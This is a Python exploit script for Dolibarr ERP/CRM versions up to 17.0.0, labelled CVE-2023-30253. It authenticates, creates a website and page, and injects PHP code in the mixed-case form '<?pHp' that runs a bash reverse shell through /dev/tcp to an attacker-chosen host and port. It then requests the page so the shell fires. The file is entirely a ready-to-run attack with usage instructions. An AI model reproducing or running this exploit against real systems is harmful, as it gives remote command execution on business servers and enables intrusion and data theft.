#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import http.client
import time
import argparse
import uuid

auth_headers = {
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Cookie": "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=aov9g1h2ao2quel82ijps1f4p7",
    "Connection": "close"
}

def remove_http_prefix(url: str) -> str:
    if url.startswith("http://"):
        return url[len("http://"):]
    elif url.startswith("https://"):
        return url[len("https://"):]
    else:
        return url

def get_csrf_token(url, headers):
    csrf_token = ""
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        soup = BeautifulSoup(response.content, "html.parser")
        meta_tag = soup.find("meta", attrs={"name": "anti-csrf-newtoken"})

        if meta_tag:
            csrf_token = meta_tag.get("content")
        else:
            print("[!] CSRF token not found")
    else:
        print("[!] Failed to retrieve the page. Status code:", response.status_code)

    return csrf_token

def auth(pre_login_token, username, password, auth_url, auth_headers):
    login_payload = {
        "token": pre_login_token,
        "actionlogin": "login",
        "loginfunction": "loginfunction",
        "backtopage": "",
        "tz": "-5",
        "tz_string": "America/New_York",
        "dst_observed": "1",
        "dst_first": "2024-03-10T01:59:00Z",
        "dst_second": "2024-11-3T01:59:00Z",
        "screenwidth": "1050",
        "screenheight": "965",
        "dol_hide_topmenu": "",
        "dol_hide_leftmenu": "",
        "dol_optimize_smallscreen": "",
        "dol_no_mouse_hover": "",
        "dol_use_jmobile": "",
        "username": username,
        "password": password
    }

    requests.post(auth_url, data=login_payload, headers=auth_headers, allow_redirects=True)
    
def create_site(hostname, login_token, site_name, http_connection):
    create_site_headers = {
        "Host": remove_http_prefix(hostname),
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryKouJvCUT1lX8IVE6",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=aov9g1h2ao2quel82ijps1f4p7",
        "Connection": "close"
    }

    create_site_body = (
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"token\"\r\n\r\n" +
        login_token + "\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"backtopage\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"dol_openinpopup\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
        "addsite\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"website\"\r\n\r\n"
        "-1\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_REF\"\r\n\r\n" +
        site_name + "\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_LANG\"\r\n\r\n"
        "en\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_OTHERLANG\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_DESCRIPTION\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"virtualhost\"\r\n\r\n"
        "http://" + site_name + ".localhost\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"addcontainer\"\r\n\r\n"
        "Create\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6--\r\n"
    )

    http_connection.request("POST", "/website/index.php", create_site_body, create_site_headers)
    http_connection.getresponse()

def create_page(hostname, login_token, site_name, http_connection):
    create_page_headers = {
        "Host": remove_http_prefix(hostname),
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryur7X26L0cMS2mE5w",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=aov9g1h2ao2quel82ijps1f4p7",
        "Connection": "close"
    }

    create_page_body = (
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"token\"\r\n\r\n" +
        login_token + "\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"backtopage\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"dol_openinpopup\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
        "addcontainer\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"website\"\r\n\r\n" +
        site_name + "\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"pageidbis\"\r\n\r\n"
        "-1\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"pageid\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"radiocreatefrom\"\r\n\r\n"
        "checkboxcreatemanually\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_TYPE_CONTAINER\"\r\n\r\n"
        "page\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"sample\"\r\n\r\n"
        "empty\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_TITLE\"\r\n\r\n"
        "TEST\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_PAGENAME\"\r\n\r\n" +
        site_name + "\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_ALIASALT\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_DESCRIPTION\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_IMAGE\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_KEYWORDS\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_LANG\"\r\n\r\n"
        "0\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_AUTHORALIAS\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreation\"\r\n\r\n"
        "05/25/2024\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationday\"\r\n\r\n"
        "25\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationmonth\"\r\n\r\n"
        "05\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationyear\"\r\n\r\n"
        "2024\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationhour\"\r\n\r\n"
        "15\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationmin\"\r\n\r\n"
        "25\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationsec\"\r\n\r\n"
        "29\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"htmlheader_x\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"htmlheader_y\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"htmlheader\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"addcontainer\"\r\n\r\n"
        "Create\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"externalurl\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"grabimages\"\r\n\r\n"
        "1\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"grabimagesinto\"\r\n\r\n"
        "root\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w--\r\n"
    )

    http_connection.request("POST", "/website/index.php", create_page_body, create_page_headers)
    http_connection.getresponse()

def edit_page(hostname, login_token, site_name, lhost, lport, http_connection):
    edit_page_headers = {
        "Host": remove_http_prefix(hostname),
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryYWePyybXc70N8CPm",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=aov9g1h2ao2quel82ijps1f4p7",
        "Connection": "close"
    }

    edit_page_body = (
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"token\"\r\n\r\n" +
        login_token + "\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"backtopage\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"dol_openinpopup\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
        "updatesource\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"website\"\r\n\r\n" +
        site_name + "\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"pageid\"\r\n\r\n"
        "2\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"update\"\r\n\r\n"
        "Save\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"PAGE_CONTENT_x\"\r\n\r\n"
        "16\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"PAGE_CONTENT_y\"\r\n\r\n"
        "2\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"PAGE_CONTENT\"\r\n\r\n"
        "<!-- Enter here your HTML content. Add a section with an id tag and tag contenteditable=\"true\" if you want to use the inline editor for the content -->\n"
        "<section id=\"mysection1\" contenteditable=\"true\">\n"
        "    <?pHp system(\"bash -c 'bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1'\"); ?>\n"
        "</section>\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm--\r\n"
    )

    http_connection.request("POST", "/website/index.php", edit_page_body, edit_page_headers)
    http_connection.getresponse()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="---[Reverse Shell Exploit for Dolibarr <= 17.0.0 (CVE-2023-30253)]---", usage= "python3 exploit.py <TARGET_HOSTNAME> <USERNAME> <PASSWORD> <LHOST> <LPORT>\r\nexample: python3 exploit.py http://example.com login password 127.0.0.1 9001")
    parser.add_argument("hostname", help="Target hostname")
    parser.add_argument("username", help="Username of Dolibarr ERP/CRM")
    parser.add_argument("password", help="Password of Dolibarr ERP/CRM")
    parser.add_argument("lhost", help="Listening host for reverse shell")
    parser.add_argument("lport", help="Listening port for reverse shell")

    args = parser.parse_args()
    min_required_args = 5
    if len(vars(args)) != min_required_args:
        parser.print_usage()
        exit()

    site_name = str(uuid.uuid4()).replace("-","")[:10]
    base_url = args.hostname + "/index.php"
    auth_url = args.hostname + "/index.php?mainmenu=home"
    admin_url = args.hostname + "/admin/index.php?mainmenu=home&leftmenu=setup&mesg=setupnotcomplete"
    call_reverse_shell_url = args.hostname + "/public/website/index.php?website=" + site_name + "&pageref=" + site_name

    pre_login_token = get_csrf_token(base_url, auth_headers)

    if pre_login_token == "":
        print("[!] Cannot get pre_login_token, please check the URL") 
        exit()

    print("[*] Trying authentication...")
    print("[**] Login: " + args.username)
    print("[**] Password: " + args.password)

    auth(pre_login_token, args.username, args.password, auth_url, auth_headers)
    time.sleep(1)

    login_token = get_csrf_token(admin_url, auth_headers)

    if login_token == "":
        print("[!] Cannot get login_token, please check the URL") 
        exit()

    http_connection = http.client.HTTPConnection(remove_http_prefix(args.hostname))

    print("[*] Trying created site...")
    create_site(args.hostname, login_token, site_name, http_connection)
    time.sleep(1)

    print("[*] Trying created page...")
    create_page(args.hostname, login_token, site_name, http_connection)
    time.sleep(1)

    print("[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection")
    edit_page(args.hostname, login_token, site_name, args.lhost, args.lport, http_connection)

    http_connection.close()
    time.sleep(1)
    requests.get(call_reverse_shell_url)

    print("[!] If you have not received the shell, please check your login and password")
